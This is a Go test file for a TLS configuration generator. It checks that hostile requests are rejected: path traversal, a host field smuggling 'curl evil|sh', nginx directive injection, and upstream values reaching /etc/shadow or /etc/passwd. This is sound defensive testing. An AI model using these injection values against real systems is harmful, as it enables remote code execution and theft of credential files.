package targets

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/sysadmin/mgtls/src/pkg/store"
)

func TestGenerateRejectsInjectionAndTraversal(t *testing.T) {
	s, _ := store.New(t.TempDir())
	out := t.TempDir()
	cases := map[string]GenerateRequest{
		"traversal name":     {TargetType: "nginx", Name: "../../../tmp/evil"},
		"shell in host":      {TargetType: "proxmox", Host: `x"; curl evil|sh; "`, OutputDir: out},
		"newline in path":    {TargetType: "nginx", ServerCertPath: "/a\nssl_verify_client off;", OutputDir: out},
		"directive upstream": {TargetType: "nginx", Extra: map[string]string{"upstream_url": "http://a; include /etc/shadow"}, OutputDir: out},
		"non-http upstream":  {TargetType: "nginx", Extra: map[string]string{"upstream_url": "file:///etc/passwd"}, OutputDir: out},
		"bad port":           {TargetType: "nginx", Port: 70000, OutputDir: out},
	}
	for name, req := range cases {
		if _, err := Generate(s, req); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

func TestGenerateSurfacesUnreadableArtifact(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root can read 0000 files")
	}
	s, _ := store.New(t.TempDir())
	key := filepath.Join(t.TempDir(), "server.key")
	if err := os.WriteFile(key, []byte("k"), 0000); err != nil {
		t.Fatal(err)
	}
	if _, err := Generate(s, GenerateRequest{TargetType: "nginx", ServerKeyPath: key, OutputDir: t.TempDir()}); err == nil {
		t.Error("unreadable server key silently ignored")
	}
}
